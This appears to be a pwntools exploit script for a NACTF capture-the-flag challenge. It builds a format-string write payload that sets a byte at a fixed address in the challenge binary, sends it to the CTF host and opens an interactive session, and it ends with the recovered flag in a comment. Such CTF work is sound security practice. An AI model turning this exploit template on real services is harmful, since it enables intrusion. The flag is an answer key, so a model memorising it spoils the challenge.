#!/usr/bin/python3
# -*- coding: utf-8 -*-
from pwn import *
import sys
from formatstring import *

exe = context.binary = ELF('./chall')
context.terminal = ["tilix", "--maximize", '-e', 'sh', '-c']
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30266)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *check_num
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.recvline()

settings = PayloadSettings(offset=6, arch=x86_64)

p = WritePayload()
p[0x404080] = b'\x42'
payload = (p.generate(settings))
print(payload)

io.sendline(payload)
print(io.recvall())
io.interactive()

#nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}